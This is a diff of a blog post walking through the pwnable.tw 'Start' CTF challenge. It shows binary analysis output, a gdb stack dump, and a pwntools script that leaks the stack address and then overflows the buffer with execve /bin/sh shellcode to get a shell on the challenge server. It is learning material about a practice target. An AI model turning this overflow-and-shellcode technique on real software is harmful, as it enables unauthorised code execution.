@@ -2,25 +2,34 @@
 layout: single_c
 title:  "Pwnable.tw Level 1 - Start"
 date:   2019-08-14 1:00:16 +0530
-categories: Pwnabletw
+categories: Pwnable.tw
 tags: ctf
 classes: wide
 --- 
-### [Pwnable.tw Level 1 - start](https://pwnable.tw/challenge/#1)
+### [Pwnable.tw Level 1 - Start](https://pwnable.tw/challenge/#1)  
 
-file start
+## Challenge
 ```
-itpc@iTPC-LT31:~/Downloads$ file orw
+Start [100 pts]
+Just a start.
+nc chall.pwnable.tw 10000
+```
+We have to obtain a flag by exploiting the given binary
+
+## Static Analysis
+Lets check the file properties using `file` and `checksec` and `readelf`
+``` bash
+user@ctf:~/Downloads$ file orw
 orw: ELF 32-bit LSB executable, <br>  
 Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,     
 BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
 
 ./checksec.sh --file ./start
-itpc@iTPC-LT31:~/Downloads$ ./checksec.sh --file ./start 
+user@ctf:~/Downloads$ ./checksec.sh --file ./start 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./start
 
-itpc@iTPC-LT31:~/Downloads$ readelf -l start
+user@ctf:~/Downloads$ readelf -l start
 
 Elf file type is EXEC (Executable file)
 Entry point 0x8048060
@@ -33,11 +42,16 @@ LOAD           0x000000 0x08048000 0x08048000 0x000a3 0x000a3 R E 0x1000
 Section to Segment mapping:
 Segment Sections...
 00     .text 
+```
+So the file doesn't seem to have `ASLR` or `canary`
+Even though `checksec` mentions that stack is non executable, there is no `GNU STACK` header so the stack is
+executable.
 
-
+Lets try disassembling the program using `objdump`
+```bash
 objdump -d start -M intel
 
-itpc@iTPC-LT31:~/Downloads$ objdump -d start -M intel
+user@ctf:~/Downloads$ objdump -d start -M intel
 
 start:     file format elf32-i386
 
@@ -74,12 +88,18 @@ Disassembly of section .text:
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80
 ``` 
-
-itpc@iTPC-LT31:~/Downloads$ ./start
+So all that the program does is that it prints some text and then read input from the user  
+Lets check if we can cause a buffer overflow
+```bash
+user@ctf:~/Downloads$ ./start
 Let's start the CTF:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault (core dumped)
 
 ```
+## Dynamic Analysis
+
+Lets analyze the program using `gdb`
+```bash
 gdb-peda$ disas _start 
 Dump of assembler code for function _start:
 0x08048060 <+0>:	push   esp
@@ -126,14 +146,15 @@ gdb-peda$ x/20wx $esp
 0xffffd134:	0xffffd300	0x00000000	0xffffd31b	0xffffd326
 0xffffd144:	0xffffd338	0xffffd368	0xffffd37e	0xffffd3af
 0xffffd154:	0xffffd3c0	0xffffd3d4	0xffffd3e4	0xffffd407
+```
+If we look at the stack after the read we can see return value at offset 20 form our input (input was `AAAABBBB`) and the saved `esp` is at offset 24. The saved `esp` points to the value next to it
 
+Now we have to find a value where we can point our `shellcode`. Since the stack is unreliable we will have
+to find a way to leak the stack address.  We can leak the address by using the following `ROP` chain
+We can leak the stack address by pointing `return` pointer to `write` at `0x08048087`
 
-we can see return value at offset 20 and saved esp at offset 24. The saved esp points to the value next to it
-leak 
-
-
-if we return to write esp which points to saved esp
-
+Take a look at the code below
+``` bash
 0x08048087 <+39>:	mov    ecx,esp
 0x08048089 <+41>:	mov    dl,0x14
 0x0804808b <+43>:	mov    bl,0x1
@@ -146,10 +167,12 @@ if we return to write esp which points to saved esp
 0x08048099 <+57>:	add    esp,0x14
 0x0804809c <+60>:	ret    
 ```
-
-now write comes again we can overflow again and add shellcode and overwrite the ret value to point to shellcode 
-our shell code wil be at leaked esp+20
-
+First the value of `esp` is copied to `ecx` and then `write` syscall is made. If we overwrite `return` with 
+`0x08048087` the program will write the value pointed by `esp` which will be the saved `esp`.  
+And now `write` comes again and we can overflow again and add `shellcode` and overwrite the `return` value to point to our shellcode.  
+our shell code will be at leaked `esp+20`  
+I wrote a script to try it first
+```python
 from pwn import *
 r = remote('chall.pwnable.tw', 10000)
 buf="A"*20
@@ -158,18 +181,43 @@ r.recvuntil('CTF:')
 r.send(buf)
 esp=u32(r.recv()[:4])
 print ("[+]ESP is at "+hex(esp))
-
-itpc@iTPC-LT31:~/Downloads/pwnable.tw$ python start.py 
+```
+```bash
+user@ctf:~/Downloads/pwnable.tw$ python start.py 
 [+] Opening connection to chall.pwnable.tw on port 10000: Done
 [+]ESP is at 0xffc8a790
+```
+We can see that we have successfully leaked the value of `esp`
+Now lets put together the exploit
+```python
+from pwn import *
 
-now lets put together the exploit
+def leak(r):
+    buf="A"*20
+    buf+=p32(0x08048087)
+    r.recvuntil('CTF:')
+    r.send(buf)
+    esp=u32(r.recv()[:4])
+    print ("[+]ESP is at "+hex(esp))
+    return esp
 
-start.py
+def exploit(esp):
+    buf="A"*20
+    eip=p32(esp+20)
+    #shellcode=asm(shellcraft.i386.linux.sh())
+    shellcode = shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+    payload=buf+eip+shellcode
+    print ("[+]Sending Payload")
+    r.send(payload)
+    r.interactive()
 
-and run it
-
-itpc@iTPC-LT31:~/Downloads/pwnable.tw$ python start.py 
+r = remote('chall.pwnable.tw', 10000)
+esp=leak(r)
+exploit(esp)
+```
+Lets  run it
+```bash
+user@ctf:~/Downloads/pwnable.tw$ python start.py 
 [+] Opening connection to chall.pwnable.tw on port 10000: Done
 [+]ESP is at 0xff846ad0
 [+]Sending Payload
@@ -179,5 +227,12 @@ $ ls
 flag
 run.sh
 start
+```
+And we have a shell. The flag is in the `flag` file
 
-solved
+### solved!
+
+## After Thoughts
+I am just a noob at binary exploitation and I found this challenge to be much more difficult that expected. And this  
+is my first time doing an ROP related exploit. (I know that its just a simple ROP). Also if you don't know what
+`pwntools` is, do check it out. Its an awesome python library that makes exploitation really easy.
